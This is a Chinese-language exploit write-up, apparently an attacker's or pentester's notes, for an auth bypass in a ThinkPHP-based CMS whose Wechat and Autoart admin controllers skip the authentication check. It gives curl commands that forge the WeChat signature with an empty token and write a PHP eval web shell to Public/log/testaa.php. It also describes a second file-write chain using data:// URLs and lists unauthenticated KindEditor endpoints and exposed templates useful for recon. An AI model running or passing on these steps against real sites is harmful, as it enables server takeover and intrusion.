## 原理
该 CMS 的后台鉴权放在 `App/Lib/Action/Admin/CommonAction.class.php::_initialize()`，只有**继承 CommonAction 的控制器**才过鉴权。
源码里存在两类「脱队」控制器：

```php
class WechatAction extends Action { }   // ← Admin 组，但不继承 CommonAction → 鉴权整体跳过
class AutoartAction extends Action { }  // ← 同上（新版新增的 Autoart 模块也是这个写法）
```

且 `CommonAction::_initialize()` 自身还有一条 `MODULE_NAME != "Index"` 的豁免，所以 `Admin/Index/*`（login/logout/index）本来就免登录。

### Wechat::index_1() 的写入原语
```php
public function index_1(){
    $weObj = $this->init();          // M("wechat")->where(array("id"=>$_GET['id']))->find()
    $weObj->valid();                 // ← 唯一的门槛：微信签名校验
    $trader = M('wechat')->where(array('id'=>$_GET['id']))->find();
    $postStr = file_get_contents("php://input");   // 原始 POST body
    $postObj = simplexml_load_string($postStr,'SimpleXMLElement',LIBXML_NOCDATA);
    file_put_contents("./Public/log/testaa.php",$postStr);   // ← 原始 body 直落 .php，无任何过滤
    ...
}
```

### 微信签名可自算（关键）
`Wechat.class.php::checkSignature()`：
```php
$token = $this->token;                                   // 来自 $config['token']
$tmpArr = array($token, $timestamp, $nonce, $str);
sort($tmpArr, SORT_STRING);                              // 二进制(ordinal)排序
$tmpStr = sha1( implode($tmpArr) );
if( $tmpStr == $_GET['signature'] ) return true;
```
- **`id` 传一个不存在的值** → `M("wechat")->find()` 返回 null → `$token = ''`（空）→ 我们完全掌握。
- GET 请求 / 非 `encrypt_type=aes` 时 `$str = ''`。
- 所以签名 = `sha1( sort_ordinal(['', timestamp, nonce, '']) 拼接 )`。
- ⚠️ `sort(...,SORT_STRING)` 是**字符串序**：`nonce` 与 `timestamp` 谁排前取决于首字符。ts 以 '1' 开头，所以 `nonce=12345` 时 → `nonce+timestamp`；`nonce=99999` 时 → `timestamp+nonce`。**必须真做 ordinal 排序，别硬编码顺序**（我第一次用 nonce=77777 硬按 nonce+ts 拼就失败在 `no access`）。

## 利用步骤
```bash
# 0) 选一个 12 位左右的随机 ename/id 值，id 用不存在的（例如 999999）
TS=$(date +%s); NONCE=12345
# 1) 按 ordinal 排序拼接后 sha1（token='' , str=''）
CONCAT=$(printf "%s" "$NONCE$TS")      # nonce=12345 < ts 时成立
SIG=$(printf "%s" "$CONCAT" | sha1sum | cut -d' ' -f1)

# 2) 只读 oracle —— 先确认签名对不对（回显 HELLOORACLE 即通过）
curl -k --noproxy '*' -s \
  "https://TARGET/example.com?g=Admin&m=Wechat&a=index_1&echostr=HELLOORACLE&signature=$SIG&timestamp=$TS&nonce=$NONCE&id=999999"

# 3) 写入 payload 到 ./Public/log/testaa.php（相对于站点根）
curl -k --noproxy '*' -s -H "Host: <白名单Host>" \
  --data-binary '<?php @eval($_POST["x"]); ?>' \
  "https://TARGET/example.com?g=Admin&m=Wechat&a=index_1&signature=$SIG&timestamp=$TS&nonce=$NONCE&id=999999"

# 4) 访问 http(s)://TARGET/Public/log/testaa.php
```

## 前置条件 / 卡点
- **`./Public/log/` 目录必须存在**。`file_put_contents` 不会自动建目录；目录缺失时只产生 E_WARNING，而 ThinkPHP 的 `appError()` 对 E_WARNING 只 `Log::record()` 不 `halt()`，所以**响应体是 200/0B，HTTP 层完全看不出失败**。
  判定目录是否存在：`GET /Public/log/` → 403 表示存在（autoindex off）、404 表示不存在；同时用 `/Public/`、`/Public/www/` 的 403 作阳性对照。
- 同类函数 `Wechat::index()` 写 `./Public/log/a1.php`、`a2.php`、`a4.php`、`test1qq.php`，同一门槛、同一目录问题。
- 该 CMS 的**另一条无鉴权写文件链**（需后台会话）：`Admin/Api::article_save` 收 POST `{url,ename,you,me}` → `file_put_contents("./Public/www/main_r3_".$_POST['ename'].".php", file_get_contents($_POST['url']))`，用 `data://text/plain;base64,<b64>` 作 url 即可原样写入 PHP，落点 `/Public/www/main_r3_<ename>.php` 可直接访问；`/Public/www/` 在部署上确实存在（403）。

## 旁路情报（同一响应/页面顺手能拿到的）
- `/App/Tpl/**.html` 模板以静态文件被 nginx 直出 → **后台整站模板源码可读**；`Admin/Public_left.html` 就是完整后台菜单，能一次性拿到全部后台控制器入口（本靶标即由它挖出备份源码里没有的新模块 `Autoart`）。
- `Admin/Autoart/*`（开奖管理）大概率同样是 `extends Action` → 零凭证 200，含 `article_save` / `editkjer` / `del` 写操作入口。
- KindEditor `/Public/main/js/kindeditor/php/upload_json.php` 与 `file_manager_json.php` 无鉴权（上传限 gif,jpg,jpeg,png,bmp；file_manager 的 `..` 有过滤）。